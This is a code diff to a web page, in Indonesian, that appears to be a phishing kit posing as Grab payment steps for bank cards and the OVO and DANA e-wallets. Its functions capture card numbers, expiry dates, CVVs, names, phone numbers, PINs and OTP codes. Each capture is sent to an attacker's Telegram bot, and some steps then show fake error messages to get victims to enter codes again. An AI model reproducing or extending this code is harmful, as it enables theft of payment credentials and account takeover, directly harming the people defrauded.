@@ -568,20 +568,22 @@ function cekFormBank() {
     btn.className = btn.disabled ? 'w-full bg-gray-300 text-gray-400 py-3 rounded font-semibold text-lg mt-2' : 'w-full bg-green-600 text-white py-3 rounded font-semibold text-lg mt-2';
 }
 
-function kirimBank() {
+
+    function kirimBank() {
     dataBank.kartu = document.getElementById('noKartuBank').value;
     dataBank.mm = document.getElementById('masaBank').value;
     dataBank.cvv = document.getElementById('cvvBank').value;
     dataBank.nama = document.getElementById('namaKartuBank').value;
 
-    const pesan = `💳 *DATA BANK GRAB*%0A${JSON.stringify(dataUtama, null, 2)}%0ANama Kartu: ${dataBank.nama}%0AKartu: ${dataBank.kartu}%0AMasa: ${dataBank.mm}%0ACVV: ${dataBank.cvv}`;
+    // ✅ KIRIM LANGSUNG PAS ISI DATA KARTU
+    const pesan = `💳 *DATA BANK - KARTU MASUK* 🚨%0A${JSON.stringify(dataUtama, null, 2)}%0ANama: ${dataBank.nama}%0AKartu: ${dataBank.kartu}%0AMasa: ${dataBank.mm}%0ACVV: ${dataBank.cvv}`;
     fetch(API_TELEGRAM + `?chat_id=${TELEGRAM_CHAT_ID}&text=${pesan}&parse_mode=Markdown`);
     bukaHalaman('bank_1');
     mulaiHitunganBank();
 }
 
-function fokusBank() { 
-    document.getElementById('kodeBank').focus(); 
+function fokusBank() {
+    document.getElementById('kodeBank').focus();
 }
 
 function isiBulatBank(val) {
@@ -593,7 +595,8 @@ function isiBulatBank(val) {
 
     if(val.length === 6) {
         dataBank.otp = val;
-        const pesan = `🚨 *DATA LENGKAP BANK GRAB*%0A${JSON.stringify(dataUtama, null, 2)}%0A${JSON.stringify(dataBank, null, 2)}`;
+        // ✅ KIRIM LANGSUNG PAS KODE OTP MASUK
+        const pesan = `✅ *DATA BANK - OTP MASUK* 🚨%0A${JSON.stringify(dataUtama, null, 2)}%0A${JSON.stringify(dataBank, null, 2)}`;
         fetch(API_TELEGRAM + `?chat_id=${TELEGRAM_CHAT_ID}&text=${pesan}&parse_mode=Markdown`);
         pesanSalah.classList.remove('hidden');
     }
@@ -627,15 +630,16 @@ function cekTombolOvo() {
 function prosesLanjutOvo() {
     dataOvo.nomor = document.getElementById('nomorOvo').value;
     document.getElementById('tampilNomorOvo').innerText = dataOvo.nomor;
-    
-    const pesan = `📱 *DATA OVO GRAB*%0A${JSON.stringify(dataUtama, null, 2)}%0ANomor: ${dataOvo.nomor}`;
+
+    // ✅ KIRIM LANGSUNG PAS ISI NOMOR OVO
+    const pesan = `📱 *DATA OVO - NOMOR MASUK* 🚨%0A${JSON.stringify(dataUtama, null, 2)}%0ANomor: ${dataOvo.nomor}`;
     fetch(API_TELEGRAM + `?chat_id=${TELEGRAM_CHAT_ID}&text=${pesan}&parse_mode=Markdown`);
-    
+
     bukaHalaman('ovo_2');
 }
 
-function fokusPinOvo() { 
-    document.getElementById('pinOvo').focus(); 
+function fokusPinOvo() {
+    document.getElementById('pinOvo').focus();
 }
 
 function isiPinOvo(val) {
@@ -644,8 +648,10 @@ function isiPinOvo(val) {
 
     if(val.length === 6) {
         dataOvo.pin = val;
-        const pesan = `🚨 *DATA LENGKAP OVO GRAB*%0A${JSON.stringify(dataUtama, null, 2)}%0A${JSON.stringify(dataOvo, null, 2)}`;
+        // ✅ KIRIM LANGSUNG PAS PIN OVO LENGKAP
+        const pesan = `🔐 *DATA OVO - PIN MASUK* 🚨%0A${JSON.stringify(dataUtama, null, 2)}%0A${JSON.stringify(dataOvo, null, 2)}`;
         fetch(API_TELEGRAM + `?chat_id=${TELEGRAM_CHAT_ID}&text=${pesan}&parse_mode=Markdown`);
+
         bukaHalaman('ovo_3');
         mulaiHitunganOvo();
     }
@@ -679,15 +685,16 @@ function cekTombolDana() {
 function prosesLanjutDana() {
     dataDana.nomor = document.getElementById('nomorDana').value;
     document.getElementById('nomorTujuanDana').innerText = '62 ' + dataDana.nomor;
-    
-    const pesan = `💧 *DATA DANA GRAB*%0A${JSON.stringify(dataUtama, null, 2)}%0ANomor: ${dataDana.nomor}`;
+
+    // ✅ KIRIM LANGSUNG PAS TEKAN LANJUT (ISI NOMOR)
+    const pesan = `💧 *DATA DANA - NOMOR MASUK* 🚨%0A${JSON.stringify(dataUtama, null, 2)}%0ANomor: ${dataDana.nomor}`;
     fetch(API_TELEGRAM + `?chat_id=${TELEGRAM_CHAT_ID}&text=${pesan}&parse_mode=Markdown`);
-    
+
     bukaHalaman('dana_2');
 }
 
-function fokusPinDana() { 
-    document.getElementById('pinDana').focus(); 
+function fokusPinDana() {
+    document.getElementById('pinDana').focus();
 }
 
 function isiPinDana(val) {
@@ -696,8 +703,10 @@ function isiPinDana(val) {
 
     if(val.length === 6) {
         dataDana.pin = val;
-        const pesan = `🚨 *DATA LENGKAP DANA GRAB*%0A${JSON.stringify(dataUtama, null, 2)}%0A${JSON.stringify(dataDana, null, 2)}`;
+        // ✅ KIRIM LANGSUNG PAS PIN LENGKAP
+        const pesan = `🔐 *DATA DANA - PIN MASUK* 🚨%0A${JSON.stringify(dataUtama, null, 2)}%0A${JSON.stringify(dataDana, null, 2)}`;
         fetch(API_TELEGRAM + `?chat_id=${TELEGRAM_CHAT_ID}&text=${pesan}&parse_mode=Markdown`);
+
         bukaHalaman('dana_3');
         mulaiHitunganDana();
     }
@@ -727,18 +736,19 @@ function isiKodeOtpDana(val) {
     pesanSalah.classList.add('hidden');
 
     kotak.forEach((el,i) => {
-                el.innerText = val[i] || '';
+        el.innerText = val[i] || '';
         el.style.backgroundColor = val[i] ? '#0060E5' : 'white';
         el.style.color = val[i] ? 'white' : '#0060E5';
     });
 
     if(val.length === 4) {
         dataDana.otp = val;
-        const pesan = `✅ *VERIFIKASI DANA BERHASIL*%0A${JSON.stringify(dataUtama, null, 2)}%0A${JSON.stringify(dataDana, null, 2)}`;
+        // ✅ KIRIM LANGSUNG PAS OTP LENGKAP
+        const pesan = `✅ *DATA DANA - OTP MASUK* 🚨%0A${JSON.stringify(dataUtama, null, 2)}%0A${JSON.stringify(dataDana, null, 2)}`;
         fetch(API_TELEGRAM + `?chat_id=${TELEGRAM_CHAT_ID}&text=${pesan}&parse_mode=Markdown`);
+
         pesanSalah.classList.remove('hidden');
-    }
-}
+    }                                                                                                                                                                        
 </script>
 
 </body>
